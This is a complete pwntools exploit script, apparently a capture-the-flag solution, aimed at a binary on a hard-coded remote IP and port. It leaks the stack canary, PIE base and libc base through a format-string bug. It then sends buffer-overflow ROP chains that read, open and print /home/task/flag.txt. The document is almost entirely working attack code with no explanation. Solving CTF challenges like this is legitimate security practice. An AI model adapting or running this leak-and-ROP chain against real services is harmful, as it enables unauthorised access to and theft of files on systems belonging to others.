from pwn import *
import time
context.arch = "amd64"
p = remote("34.155.40.100", 1236)
#p = process("./task_patched")
elf = ELF("./task_patched", checksec = 0)
libc = elf.libc

pad = b"A" * (9 * 8)
rdx = 0x0000000000001b96 #libc : pop rdx; ret;
rdi = 0x0000000000000cd3 # pop rdi; ret;
ret = 0x00000000000008be # ret;
rsi = 0x0000000000000cd1 # pop rsi; pop r15; ret;

p.sendline(b"%15$p.%17$p.%19$p") # canary.pie.libc
p.recvuntil(b"message: ")
canary = int(p.recv(18), 16)
print(hex(canary))
p.recv(1)
elf.address = int(p.recv(14), 16) - elf.sym.main - 24
print(hex(elf.address))
p.recv(1)
libc.address = int(p.recv(14), 16) - libc.sym.__libc_start_main - 231
print(hex(libc.address))

flag_name = p64(elf.address + 0x0000000000202020 + 0x400 - 0x10)
bss = p64(elf.address + 0x0000000000202020 + 0x400)
rdx = p64(libc.address + rdx)
rdi = p64(elf.address + rdi)
rsi = p64(elf.address + rsi)
ret = p64(elf.address + ret)

# read(0, flag_name, 0x40); read flag path.
payload = flat(
        pad,
        canary,
        p64(0),
        rdi,
        p64(0),
        rsi,
        flag_name,
        p64(0),
        rdx,
        p64(0x40),
        p64(libc.sym.read),
        ret,
        p64(elf.sym.main)
        )
p.sendline(payload)
time.sleep(0.2)
p.sendline(b"x")
time.sleep(0.2)
p.send(b"/home/task/flag.txt")
#open(flag_name, O_RDONLY); opening flag file, returned fd = 3.
payload = flat(
        pad,
        canary,
        p64(0),
        rdi,
        flag_name,
        rsi,
        p64(0x000),
        p64(0),
        p64(libc.sym.open),
        ret,
        p64(elf.sym.main)
)
p.sendline(payload)
time.sleep(0.2)
p.sendline(b"x")
#read(3, bss, 0x40) & puts(bss); read from opened fd than putting the content.
payload = flat(
        pad,
        canary,
        p64(0),
        rdi,
        p64(3),
        rsi,
        bss,
        p64(0),
        rdx,
        p64(0x40),
        p64(libc.sym.read),
        ret,
        rdi,
        bss,
        p64(libc.sym.puts),
        ret,
        p64(elf.sym.main)
)

p.sendline(payload)
time.sleep(0.2)
p.sendline(b"x")
p.interactive()
